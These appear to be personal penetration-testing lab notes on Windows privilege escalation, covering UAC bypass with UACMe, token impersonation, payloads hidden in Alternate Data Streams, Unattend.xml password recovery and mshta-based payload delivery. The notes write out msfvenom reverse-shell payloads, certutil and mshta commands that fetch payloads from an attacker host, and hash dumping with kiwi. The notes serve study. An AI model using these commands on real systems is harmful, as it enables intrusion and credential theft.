Privilege escalation involves taking advantage of system vulnerabilities or misconfigurations to increase a user's access level, typically elevating from a standard user to one with administrative or root privileges. It is a crucial part of the attack lifecycle and directly impacts the success of penetration testing. Once an initial foothold is gained on a system, escalating privileges is necessary to perform tasks requiring administrative access such as data exfiltration or pivoting. 

#### Windows Kernel

A kernel is a program that's the core of an operating system, responsible for controlling hardware and system resources. It acts as a translation layer between hardware and software, facilitating communication between the two layers. Windows NT is the kernel pre-packaged with Windows and operates in two main modes that determine access to system resources:
- **User Mode** – Programs and services running in user mode have limited access to system resources and functionality. Third-party applications/program 
- **Kernel Mode** – Kernel mode allows unrestricted access to system resources, including the ability to manage hardware, devices, and system memory. The kernel is often targeted as code executed in the kernel space will be executed with the highest privileges available.

#### Windows Kernel Exploitation

Kernel exploits on Windows usually target vulnerabilities in the Windows kernel to execute arbitrary code, allowing attackers to run privileged system commands or gain access to a system shell. The approach varies depending on the Windows version and the specific kernel exploit used. Kernel exploit is not recommended in most environments since it can lead to crashing the system. The typical process for privilege escalation on Windows involves:

1. Identifying kernel vulnerabilities.
2. Downloading, compiling, and transferring kernel exploits to the target system.


**Windows-Kernel-Exploits** - Collection of Windows Kernel exploits sorted by CVE.  
+ GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-

---

#### Metepreter `getsystem` command

In a Meterpreter session, the `getsystem` command is used to elevate privileges on the compromised machine to the highest possible level—typically, the _SYSTEM_ account on Windows systems.  When you run the command, Meterpreter tries various built-in privilege escalation techniques to elevate privileges. Here are a couple of common methods it employs:
- **Named Pipe Impersonation** - This technique leverages the ability to impersonate tokens from privileged processes. Windows services often use named pipes for inter-process communication, and in some cases, a low-privileged process can access pipes from a higher-privileged service. By hijacking these pipes and impersonating the tokens, `getsystem` can elevate the session to SYSTEM privileges. 
- **Token Duplication**: This technique involves duplicating an access token associated with a process that already has SYSTEM privileges. If a process with these privileges is running, `getsystem` can try to copy its token and use it to escalate privileges.

#### Metasploit Local Exploit Suggester

Metasploit has a post exploitation module 'local_exploit_suggester'  that can look for vulnerabilities pertinent to a version of a windows/linux operating system. This is post exploitation as the module requires a meterpreter session of a compromised system:

1. **Find/Use the module**: You can either search Metasploit for `suggester` or use the module  `post/multi/recon/local_exploit_suggester`.
```
search suggester

use post/multi/recon/local_exploit_suggester
```

2. **Configure the module**: You need to specify the meterpreter session that you want to run the module on with the `SESSION` option. You can confirm sessions using the background sessions you have with the `sessions` command.
```
set SESSION 2
```

3. **Run the module**: This will enumerate the vulnerabilities and display any local metasploit modules that could be used for privilege escalation. 
```
run
```

**Note: Make sure to research the found exploits to confirm what the exploit does and if its applicable to the version of the operating system.**


#### Manual Privilege Escalation

**Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. <u>This repo has been archived and hasn't been actively maintained since July 2023</u>.

+ GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1. **Export contents of `systeminfo` to a file**: The information from the `sysinfo` needs to be saved since there's hotfixes applied to the system where the suggester will use to find vulnerabilities for. Either copy-paste the output to a txt file or use a redirect to output it to a file
```
systeminfo > output.txt
```

2. **Download the Windows Exploit Suggester zip**:  You can find the URL to download the zip from the Github repo
```
curl -L https://github.com/AonCyberLabs/Windows-Exploit-Suggester/archive/refs/heads/master.zip -o suggester.zip
```
- The `-L` (or `--location`) option in `curl` tells it to follow redirects. When you make a request to a URL that responds with an HTTP redirect (3xx status code) curl by default does **not** follow the redirection to the new location. The `-L` option tells `curl` to automatically follow the redirection and retrieve the content from the final location. This is useful when downloading files from URLs that might redirect to a different download location.

3. **Extract the zip download:** You can use powershell's built-in cmdlet  `Expand-Archive` to extract ZIP files:
```
Expand-Archive -Path .\original.zip -DestinationPath .\destination-folder
```

4. **Download the updated MS Vuln Database:** Run the suggester script with the `--update`' to pull the updated database. This should output an .xls file of the database like `2023-06-02-msb.xls` which is dated to the time the command was ran.
```
.\windows-exploit-suggester.py --update
```
5. **Run suggester**: You need to specify `--database` which is the MS vulnerability database xls file and `--systeminfo` which is set to the location of the txt file for the systeminfo command. The output will have the vulnerabilities most likely to work on the system at the top. Prioritize exploits that provide privilege escalation.
```
.\windows-exploit-suggester.py --database 2023-06-02-msb.xls --systeminfo win7.txt
```

### Windows Kernel Exploits
Note: For Windows Kernel Exploits SecWiki's Github is recommended.
https://github.com/SecWiki/windows-kernel-exploits/

Can navigate to the Temp directory on the Windows system which should be on the root of the C:\  Drive

```
meterpreter> upload file.exe
```

From the session, run the exe exploit.

### UAC

User Account Control (UAC) is a Windows security feature that prevents unauthorized changes to the operating system by requiring administrator approval for elevated actions. Non-privileged users will be prompted to provide administrative credentials to perform the action, while privileged users willl be prompted with a Yes/No consent before continuing. Attacks can attempt to bypass UAC to execute malicious software with elevated privileges.
##### Bypassing UAC

<u>To bypass UAC, access to a user account within the local administrators group of the target system is required</u>. UAC prompts users to confirm or provide credentials before granting administrative privileges.

UAC has integrity levels ranging from low to high, if the UAC protection level is set below "high," some programs can run with elevated privileges without prompting the user. So, for example, if we create a meterpreter payload with msfvenom payload and have it successfully uploaded/executed on the target with administrative privileges, we would then bypass UAC without the need for the consent prompt.

There are various tools and methods to bypass UAC, but the choice of technique depends on the version of Windows and the UAC integrity level configured on the target system.
#### UACMe

UACMe is an open-source privilege escalation tool developed by @hfire0x, designed to bypass Windows User Account Control (UAC) and gain elevated privileges on Windows systems. It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Window AutoElevate tool. The UACMe GitHub repository includes various methods for bypassing UAC, applicable to multiple Windows versions from Windows 7 to Windows 10.  To use UACMe, you need to compile the source code in the 'Source' directory which contains C code.
- GitHub: https://github.com/hfiref0x/UACME

To make UCAMe work to bypass UAC we'll need the following: 
- x86-32/x64 Windows 7/8/8.1/10/11 client (some methods however works on server version too).
- Admin account with UAC set on default settings required.

**Default UAC Description:**

"Notify me only when apps try to make changes to my computer (default)"

```
- Notify you when programs try to install software or make changes to your computer
    
- Not notify you when you make changes to Windows settings
    
- Freeze other tasks until you respond
```
##### Bypassing UAC Steps with UACMe 
1. Compile the UACMe akagi32/akagi64 source code to an executable.
2. Gain initial access to a system to get a meterpreter session
3. Upload the meterpreter payload and akagi executable to the target
4. Run the payload with Akagi to bypass UAC and get elevated meterpreter session

---
1. <u>Gain Initial Access on the target</u>: Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.

**Useful Meterpreter Commands/Tips:**
- Get current user => `getuid`
- Check the current user's privileges => `getprivs`
- If you have a x86 meterpreter session, you can migrate to the explorer process which should give you that x64 session.
```
meterpreter> pgrep explorer
2342
meterpreter> migrate 2342
```

**Windows Commands:**
- View users => `net user`
- Check the local administrator group => `net localgroup administrators` | Make sure the current user you're using is in this group

In the shell session, you'll receive an "`System error 5 has occured. Access is denied` " since we'd need to respond to the UAC consent prompt which can't be done through the shell unless you bypass UAC.

---
2. <u>Create the metepreter payload with msfvenom and start a listener with multi handler</u>: We're creating the msfvenom payload because the initial Meterpreter session may lack high privileges or is unstable. Running the payload with UACMe will elevate the meterpreter session's privileges, ensuring the new payload establishes a fully privileged and hopefully more stable session. 
```
msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
```

Example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.59 LPORT=2345 -f exe > backdoor.exe
```

Start another metasploit instance (`service postgresql start && msfconsole`) and use `multi/handler` to listen for the connection from the  payload.

- **Use/configure the module**: Set the configured payload to the one set from msfvenom. Next, we'll also need to set the `LHOST`/`LPORT` to the same one specified in the payload:
```
msf6> use multi/handler

msf6> set payload windows/meterpreter/reverse_tcp

msf6> set LHOST 10.10.41.59

msf6> set LPORT 2345
```
- **Run the module**: This will start the listener. When the payload is executed on the target it will connect back here.
```
msf6> run
```

---
3. <u>Upload the executables to the target</u>: Use the initial meterpreter/shell session to upload the reverse shell payload and akagi executable. It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target.

```
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp\\
```

- Use the `upload`command to push the backdoor executable to the target.
```
meterpreter> upload backdoor.exe
```

- Next, upload the Akagi executable to the target
```
meterpreter> upload UACME/Akagi64.exe
```

4. <u>Run Akagi with the payload </u>: If you try to just run the payload backdoor now, UAC will prevent the execution. We'll run akagi with the payload. UACMe uses an akagi32/akagi64 executable which you need to specify a `Key` which is the number of method to use and then a `Parameter` which is the path to the payload executable you want to execute.  Look into the 'Keys' section listed in the description of the Github repository. Method 23 is recommended on windows 10 systems but doublecheck to see which Keys were fixed/patched. The execution of the executable should bypass UAC. Try to locate methods that work for the target operating system and hasn't been listed as fixed.
```
akagi_exe [method_num] payload_location
```

Example:
```
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

This will run the payload bypassing UAC, you can check the listener to see the new meterpreter session being setup.

You should be able to run `ps` on the new meterpreter session to view the services on the target system, you should be able to migrate to any of these services, particularly any services running `NT AUTHORITY\SYSTEM` which would then escalate your privileges. If you migrated to one of these services running NT AUTHORITY\SYSTEM, you should have the permission to  perform actions like dumping NTLM hashes using something like Kiwi. In Metasploit, `kiwi` is an extension of **Meterpreter** that provides credential extraction capabilities similar to Mimikatz. 

- **Load the Kiwi extension**
```
meterpreter> load kiwi
```
- **Run the 'lsa_dump_sam' command**: The`lsa_dump_sam` is a command in the Kiwi extension (or Mimikatz) that extracts NTLM and LM password hashes for local users from the Security Account Manager (SAM) database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz:
```
meterpreter> lsa_dump_sam
```
- **View the Hashes**: The hashes should also display after running the `lsa_dump_sam` command but can also run `hashdump` which would display the same hashes:
```
meterpreter> hashdump
```


---

### Windows Access Tokens

A Windows access token is a core element of the authentication process, identifying the security context of a process or thread and acting like a temporary key that grants access to system or network resources without requiring credentials for each access. 

Access tokens are created and managed by both **LSASS (Local Security Authority Subsystem Service)** and **winlogon**, but each plays a distinct role. LSASS handles the overall security policy and creates tokens for security operations, including non-interactive logons and background processes. The **winlogon** generates access token for interactive logon when a user successfully authenticates. Winlogon handles the sign-in prompt when you login into the computer. These tokens contains the identity and privileges of the user account which are then attached to the **userinit.exe** process to ensure all child processes started by the user will inherit a copy of the same token. This allows the processes to run with the same privileges as the authenticated user.

Access tokens essentially are used to restrict what users can/cannot execute. Windows access tokens are categorized by security levels, which determine their assigned privileges.
- **Impersonate-level tokens** result from non-interactive logins typically through  system services or domain logons and allow impersonations only on the local system.
- **Delegate-level tokens** come from interactive logins like traditional logins or RDP and pose a greater risk since they can impersonate tokens across multiple systems.

The ability to impersonate access tokens for privilege escalation depends on the privileges of the compromised account and the available impersonation or delegation tokens. Key privileges required for a successful impersonation attack include:
- **SeAssignPrimaryToken**: Allows user to impersonate tokens
- **SeCreateToken**: Allows creation of arbitrary tokens with administrative privileges.
- **SeImpersonatePrivilege**: Permits creating processes under another user's security context, often with administrative access. This privilege is especially important.
#### Incognito

The Incognito module, originally a standalone application, is now integrated into Meterpreter. It allows impersonation of user tokens after successful exploitation. This module can also display a list of tokens available for impersonation.

1. <u>Initial Access:</u> Perform an nmap scan on the system and then try to exploit any services on an open port to get a meterpreter session.

2. <u>Check Privileges</u>: Can confirm the current user with `getuid` and then check their privileges with `getprivs`. Make sure it has at least of one the three privileges:
	- **SeAssignPrimaryToken**
	- **SeCreateToken**
	- **SeImpersonatePrivilege**

3. <u>Load Incognito</u>: Load the incognito extension from the meterpreter session.
```
load incognito
```

4. <u>View Access Tokens</u>: Run `list_tokens` to view the available access tokens. Note any potential admin accounts
```
list_tokens -u
```

5. <u>Impersonate a Token</u>: Use `impersonate_token` for the actual impersonation, copy/paste the admin user within quotes.
```
impersonate_token "ATTACKDEFENSE\Administrator"
```

6. (**Optional) Rinse and Repeat**: If you successfully impersonated an administrator, you'll likely have more access tokens available like `NT AUTHORITY \ SYSTEM` which you could try to impersonate again.

###### NOTE: You'll be in a situation where there's no delegation or impersonation access tokens available. In this case, you'll need a potato attack to generate a NT AUTHORITY \ SYSTEM access token to impersonate it.


### Alternate Data Streams (ADS)

Alternate Data Streams (ADS) is a file attribute of the NTFS (New Technology File System) designed to provide compatibility with the MacOS HFS (Hierarchical File System). Every file on an NTFS-formatted drive contains two streams:

- **Data stream**: The primary stream holding the actual content of the file.
- **Resource stream**: A secondary stream used to store metadata, which can also contain additional hidden data.

An ADS can hold executable code or other payloads within the resource stream of an otherwise legitimate file. Attackers use this feature to conceal malicious content, making it harder to detect with conventional signature-based antivirus tools and static scanners. This technique allows malicious payloads to remain hidden while appearing as benign files.

#### Creating and Accessing Alternate Data Streams

To store or access data in a resource stream, a colon (`:`) is used to specify the alternate stream within the file.

```
test.txt:secret.txt
```

This command opens the **`secret.txt`** file hidden within the **resource stream** of `test.txt`. The hidden stream will not be visible through normal file listings, adding another layer of stealth.

#### Redirecting a Payload into a Resource Stream

Attackers can redirect malicious executables or payloads into the resource stream of legitimate files to evade detection. The `type` command can transfer the contents of a payload into the resource stream of a file.

```
type payload.exe > windowslog.txt:winpeas.exe
```

To make the log file look legitimate, you could add content to the primary stream using Notepad:
```
notepad windowslog.txt
```

The hidden payload can then be executed directly from the resource stream:
```
start windowslog.txt:winpeas.exe
```

#### Using Symbolic Links with ADS

Attackers can also use **symbolic links** to disguise or redirect access to the hidden payloads within resource streams. A symbolic link is a pointer that refers to a file or directory elsewhere, further obfuscating malicious activity.

Example of creating a symbolic link within the `C:\Windows\System32` directory:

```
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```

When the link, which is `wpdate.exe` here, is executed from the command line, it triggers the hidden payload:

```
wupdate
```

# Windows-Credential Dumping


**Windows Password Hashes**

Windows stores hashed passwords locally in the SAM (Security Accounts Manager) database. Hashing is the process of converting a piece of data using a hashing function/algorithm into another new value called a hash or hash value.  In the early 2000s the encryption process was revised so that the password string provided would be automatically hashed and stored to prevent keeping clear-text passwords. Authentication would be compared to the hashed password.

The Local Security Authority (LSA) manages the verification process which is tied to the LSASS process. Older Windows versions (up to Server 2003) used two types of hashes: LM and NTLM. However, starting from Windows Vista, LM hashing was disabled, with NTLM becoming the default. Very unlikely to see LM hashing in the wild.

**SAM Database**

The SAM is a database file that's responsible for managing user accounts and passwords on Windows systems. Windows has a security feature which prevents the SAM database file from being copied while the operating system is running.

With the SAM database file being locked by the Windows NT kernel,  attackers would typically utilize memory techniques/tools like Mimikatz to dump SAM hashes from the LSASS process.  Elevated/Administrative privileges are required to interact with the LSASS process.

In modern versions of Windows, the database is encrypted with a syskey.

**LM Hashing**

LM (LanMan) was the default hashing algorithm used in Windows operating systems prior to NT4.0 but is considered weak today. It splits passwords into two seven-character chunks, converts them to uppercase, and hashes each with DES. LM hashing lacks salts, making it vulnerable to brute-force and rainbow table attacks, which can easily crack the passwords. LM Hashing is disabled from Windows Vista and onwards.

```
Password123 -> PASSWO + RD123 -> DES -> LM_HASH1+LM_HASH2
```

**NTLM Hashing**

NTLM is a more secure authentication protocol used from Windows Vista onwards replacing LM hashing. When a user account is created, it encrypts the passwords using the MD4 hashing algorithms while disposing the original clear-text password.  NTLM offers improvements over LM, such as case sensitivity, not splitting the hash, and supporting symbols and Unicode characters, making it harder to crack.

```
!PassW0RD321@ -> MD4 -> NTLM hash
```

##### Windows Configuration Files  

Windows can automate repetitive tasks, like mass installations, using the Unattended Windows Setup utility. This tool relies on configuration files that specify system settings and store credentials, including the Administrator password. If these files remain on a system after installation, they could expose credentials, allowing attackers to authenticate and access the system.

**Unattended Windows Setup**  
The Unattended Windows Setup utility uses the following configuration files that contain user account and system config information:
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`
For security, any passwords within these files may be encoded in base64.

### Search For Passwords in Windows Config Files / Unattended Installation

Exploitation Steps:
1. First gain initial access into the system with a meterpreter session
2. Next, use the meterpreter session to find the unattended xml file
3. Identify the password and decode it with a base64 utility.
4. Authenticate with the target with PsExec

##### Generate a meterpreter payload using MSFVenom

MSFVenom is used for generating payloads for a reverse shell.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.66.82 LPORT=4321 -f exe > payload.exe
```
- `-p` = Payload
- `-LHOST`/`LPORT` = Attack machine's IP and port
- `-f` = file type

##### Host a website for the payload.exe

We'd normally try to establish initial access by exploiting a service but we can run the built-in Python module `SimpleHTTPServer` to quickly launch an HTTP server to serve files from a directory containing the payload that can be downloaded to the target. Simply run it in the target directory, and it will host the contents over HTTP on the specified port.

```
python -m SimpleHTTPServer 80
```

You can use the `certutil` command on the windows system to download the payload.
```
certutil -urlcache -f http://<server_ip>/payload.exe payload.exe
```

Use could try to use meterpreter's in-built search to search for the type of files you're interested in.

```
search -f <file>.txt
```

Look for `<AutoLogon>` tag, this should have hard-coded credentials. We'd know any password is encoded if the `<PlainText>` tag is set to false.

```
<AutoLogon>
	<Password>
		<Value>QWRtaW5AMTIz</Value>
		<PlainText>false</PlainText>
	</Password>
	<Enabled>true</Enabled>
	<Username>administrator</Username>
</AutoLogon>
```

Use kali's base64 decoder to extract the credentials. You can output using `-o` to a file if you'd like:

```
base64 -d password.txt 
```

The password could be used through something like PsExec
#### Psexec Python Script

Psexec is a windows executable which can't be ran on a Linux system. We can use the `psexec.py` which is a python implementation of the software. 

```
psexec.py Username@Target <cmd_to_execute_on_system>
```
Example: You can run psexec.py against the target and try to execute a shell using cmd.exe:
```
psexec.py Administrator@10.63.45.88 cmd.exe
```


### PowerSploit to find Unattended Installation files

**PowerSploit** is a collection of Microsoft PowerShell modules designed to assist penetration testers during all phases of an assessment. One of these modules, **PowerUp.ps1**, focuses on identifying common Windows privilege escalation vectors that exploit misconfigurations. We will run the PowerUp.ps1 script to detect potential privilege escalation vulnerabilities on the system.
- **Github**: https://github.com/PowerShellMafia/PowerSploit

1. Navigate to the PowerUp Script:
```
..\PowerSploit\Privesc\
```

2. <u>Starts a new PowerShell session with the execution policy set to "bypass"</u>: Normally, PowerShell enforces an execution policy to prevent untrusted scripts from running (like "Restricted" or "RemoteSigned"). Setting the execution policy `-ep`  to bypass tells PowerShell to ignore those restrictions just for this session, allowing any script to run freely.
```
powershell -ep bypass
```

3. <u>Import the PowerSploit PowerUp script</u>: Importing the PowerSploit script makes its functions and variables available for use. The dot-sourcing operator **(`.`)** makes sure the script runs in the **current session**, not a new one, allowing its contents to stay in memory and be directly accessible whenever needed throughout the session. Without dot-sourcing, the script would run in isolation, meaning functions like `Invoke-PrivescAudit` wouldn’t be available once the script finishes.
```
. .\PowerUp.ps1
```

4. <u>Run the PrivescAudit function</u>:  The `Invoke-PrivescAudit` function defined within the PowerUp.ps1 script that runs the privilege escalation audit, scanning for misconfigurations like vulnerable services or weak file permissions. Since the script was dot-sourced, this function is now available in the current PowerShell session.
```
Invoke-PrivescAudit
```

The output should find any vulnerabilities like a **Unattend.xml** file present on the system. Open the **Unattend.xml** file.
```
cat C:\Windows\Panther\Unattend.xml
```

 Decoding administrator password using Powershell.
 
```
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

1. `[System.Convert]::FromBase64String(...)`: The base64 string is a textual representation of binary data. To retrieve the original password, we first need to decode it into its binary form, as this binary data holds the raw content necessary for converting to readable text. The `System.Convert` .NET class provides methods for data type conversions, and here we use its `FromBase64String` method to convert the base64 string into a byte array, which represents the raw binary data. Since the byte array is not directly human-readable, it must be further processed.

2. `[System.Text.Encoding]::UTF8.GetString(...)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell, ensuring that the decoded string is properly interpreted as human-readable text. 

We can now leverage the administrative credentials to **escalate privileges and gain an elevated Meterpreter session**.

This information was really helpful I would like to have the information to be reformatted and flow a bit better and not use bullets and have them in paragraph format and to not have it be "Reason: Explanation" like you did for certain topics like >
"**Post-Exploitation Situations**: If you have already gained user-level access and need **privilege escalation**, this method can deliver the payload under elevated privileges (assuming the right user opens it)." I just want to entire explanation together. Also, I'm not really sure what embedded powershell means so can you an an explanation what that means especially when it comes to hta files when its relevant in the information:


----
##### mshta.exe and an HTA File to Gain a Meterpreter Session


mshta.txt


Using `mshta.exe` with an HTA file to gain a **Meterpreter session** is an exploitation method that leverages legitimate tools for access. Microsoft's HTML Application host aka `mshta.exe` is a Microsoft binary designed to execute HTML-based applications (HTA files). HTA files can run embedded PowerShell code, hidden within the file, which executes when the application runs and creates a **reverse shell** to the Meterpreter. Since `mshta.exe` is a legitimate component of the Windows operating system, this method demonstrates **Living off the Land (LotL)** tactics, where attackers rely on tools already installed on the target system to **evade detection** by antivirus (AV) or endpoint detection and response (EDR) solutions. Also, although PowerShell is often restricted by execution policies that block untrusted scripts, `mshta.exe` **bypasses these restrictions** by running the embedded PowerShell commands directly from the HTA file.


Using the `hta_server` module in **Metasploit** to host and serve the HTA file allows the payload to be delivered **over the network**, eliminating the need to manually transfer files to the target system. This is particularly useful when direct file uploads are risky or monitored. The target machine only needs to **visit the malicious URL once** (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) for the payload to be executed, providing a quick and efficient way to establish remote access. Once the embedded powershell commands of the **HTA payload** is executed and the Meterpreter session is established, the session runs **independently of the command prompt**. This makes the method ideal for one-time exploitation or scenarios where persistent access isn’t required.  The session will stay active as long as the connection between the target and attacker’s machine remains intact, but persistence mechanisms are required  (e.g., a scheduled task or registry key) if you want to maintain access through reboots or process restarts.

In this lab, since the command prompt (`cmd.exe`) was **launched with administrator privileges** using the `runas.exe` command, any subsequent process—such as the HTA payload run with `mshta.exe`—inherits the same elevated privileges. This means that the resulting Meterpreter session will have **administrator-level access**, allowing for privileged operations such as disabling security tools, extracting passwords from memory, or modifying system configurations.

Many endpoint security solutions don’t monitor or block `mshta.exe` as aggressively as custom executables. This makes it a highly effective way to deliver and execute malicious code without raising immediate suspicion. When file transfer to the target system is not feasible, **network-hosted delivery using the HTA server** ensures remote code execution without leaving obvious traces. This method teaches the importance of **chaining privilege escalation with remote code execution**, as it demonstrates how attackers can use legitimate tools to gain elevated access and maintain control over a system.








**Step 7:** We can ran a command prompt as an administrator user using discover credentials.  The elevated cmd prompt can be used to 



```
runas.exe /user:administrator cmd
```







---





**Step 8:** Running the **hta_server** module to gain the meterpreter shell. Start msfconsole.

**Commands:**

```
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.”



Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on cmd.exe with mshta command to gain the meterpreter shell.

**Switch to Target Machine.**

**Step 9:** Gaining a meterpreter shell.

**Command:**

```
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

**Note:** You need to use your own metasploit HTA server link.

We can expect a meterpreter shell.

**Step 10:** Find the flag.

**Commands:**

```
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```


# Linux-Vulnerabilities

# Exploiting-Linux-Vulnerabilities

# Linux-Privilege-Escalation

# Linux-Credential-Dumping